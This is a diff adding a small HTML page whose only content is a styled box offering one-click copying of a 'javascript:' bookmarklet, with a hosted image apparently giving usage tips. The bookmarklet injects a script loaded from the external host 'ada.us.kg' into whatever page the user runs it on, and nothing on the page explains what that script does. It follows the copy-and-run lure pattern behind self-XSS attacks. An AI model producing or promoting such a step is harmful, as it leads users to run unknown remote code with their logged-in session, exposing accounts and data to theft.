@@ -1,0 +1,47 @@
+<style>
+.copy-btn {
+  position:absolute; 
+  top:10px; 
+  right:10px; 
+  background:#00eaff; 
+  color:#001f2d; 
+  border:none; 
+  padding:5px 10px; 
+  border-radius:4px; 
+  cursor:pointer; 
+  font-size:14px;
+  transition: all .3s ease;
+}
+.copy-btn.copied {
+  background:#00ff9d;
+  color:#003322;
+  transform: scale(1.1);
+}
+</style>
+
+<div style="position: relative; background:#001f2d; color:#00eaff; padding:15px; font-size:18px; font-family:Consolas, monospace; border-left:5px solid #00eaff; border-radius:6px;">
+  <button id="copyBtn" onclick="copyCode()" class="copy-btn">COPY</button>
+
+  <pre id="codeBlock" style="white-space:pre-wrap; margin:0;">
+=javascript:(function(){var s=document.createElement('script');s.src='https://ada.us.kg';document.body.appendChild(s)})();
+  </pre>
+</div>
+
+<hr>
+<img src="https://img.didadi.xyz/file/1790060133030_tips.png" alt="tips.png" width=100% style="max-width:100%; height:auto;"/>
+
+<script>
+function copyCode() {
+  const code = document.getElementById("codeBlock").innerText;
+  navigator.clipboard.writeText(code);
+
+  const btn = document.getElementById("copyBtn");
+  btn.classList.add("copied");
+  btn.innerText = "Copied";
+
+  setTimeout(() => {
+    btn.classList.remove("copied");
+    btn.innerText = "COPY";
+  }, 1200);
+}
+</script>
